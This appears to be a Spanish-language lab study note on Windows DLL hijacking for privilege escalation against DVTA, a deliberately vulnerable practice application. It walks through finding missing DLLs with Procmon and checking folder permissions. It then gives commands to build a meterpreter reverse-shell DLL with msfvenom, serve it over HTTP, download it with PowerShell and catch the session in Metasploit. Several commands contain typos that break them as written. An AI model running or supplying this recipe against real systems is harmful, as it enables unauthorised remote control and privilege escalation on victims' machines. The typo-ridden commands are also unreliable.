
Ataque de escala de privs en el que se manipula la forma en la que windows ejecuta una DLL añadiendo código malicioso.

Pasos a realizar:

1. Identificar aplicaciones vulnerables
	1. Determinar aplicaciones con privilegios
	2. Analizar sus dependencias con DLL
2. Examinar el orden de DLL
	1. Entender el orden por defecto. Windows tiene un orden predefinido para buscar DLLs que generalmente empieza con el directorio de aplicaciones.
	2. Identificar puntos potenciales de inserción.
3. Injectar una DLL maliciosa
	1. Crear una maliciosa DLL
	2. Poner la DLL en una localización estratégica.

Vamos a utilizar la herramienta Procmon64 para analizar las dependencias de DLL.

Hay que desactivar las opciones de:
- Actividad de registro
- Actividad de red

![[Pasted image 20250221091248.png]]

Nos interesan las que tienen en Operation -> Create File.

Vamos a analizar el programa o aplicación dvta (hay que iniciarlo) y para ello desde el botón de filtro especificamos el nombre de proceso (DVTA.exe).

![[Pasted image 20250221091445.png]]

El siguiente paso sería filtrar la columna Result para que nos muestre las DLL que no han sido encontradas.

![[Pasted image 20250221091522.png]]

Una vez encontremos alguna DLL nos tenemos que asegurar que nuestro usuario pueda acceder y modificar archivos en esa ubicación.

```powershell
Get_ACL 'C:\Users\Administrator\Desktop\dvta\bin\Release' | Format-list'
```

![[Pasted image 20250221091754.png]]

El usuario actual 'Student' tiene acceso al directorio, con lo que podemos poner una DLL maliciosa.

```bash
#Generar la dll maliciosa.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP PORT=4444 -f dll > DWrite.dll

#generar servidor de conexión
python -m SimpleHTTPServer 80

#Activer el listener desde metasploit
msfconsole -q
use multi/handler
set pauload windows/meterpreter/reverse_tcp
show options
exploit
```

```powershell
iwr -UseBasicParsing -Uri http://ip/DWrite-dll -OutFile DWrite.dll
```

Y con iniciar la aplicación de nuevo meterpreter detectará una nueva sesión con los permisos de quien ejecute la aplicación.